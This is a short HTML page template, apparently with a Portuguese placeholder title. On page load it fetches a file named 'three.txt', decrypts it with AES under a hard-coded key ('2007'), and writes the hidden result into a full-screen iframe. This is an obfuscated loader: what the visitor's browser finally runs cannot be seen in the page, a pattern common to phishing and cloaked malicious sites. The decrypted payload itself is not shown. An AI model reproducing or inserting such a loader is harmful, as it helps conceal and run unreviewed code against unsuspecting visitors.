<!DOCTYPE html> <html lang="pt-br"><head><meta charset="UTF-8"><meta name="viewport" id="viewport" content="width=device-width, initial-scale=1"><title>Seu t√≠tulo</title><script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script><style>body,html{margin: 0;padding: 0;height: 100%;overflow:hidden;}#c{width: 100%;height: 100%;border: none;}</style></head><body><iframe id="c"></iframe><script>function ex() { var u = 'three.txt';var k='2007';fetch(u).then(response=>response.text()).then(encryptedCode => {var decryptedCode=CryptoJS.AES.decrypt(encryptedCode,k).toString(CryptoJS.enc.Utf8);var iframeDocument=document.getElementById('c').contentDocument; iframeDocument.open();iframeDocument.write(decryptedCode);iframeDocument.close();}).catch(error =>{console.error('Erro ao acessar o arquivo:', error);});}ex();</script></body></html>
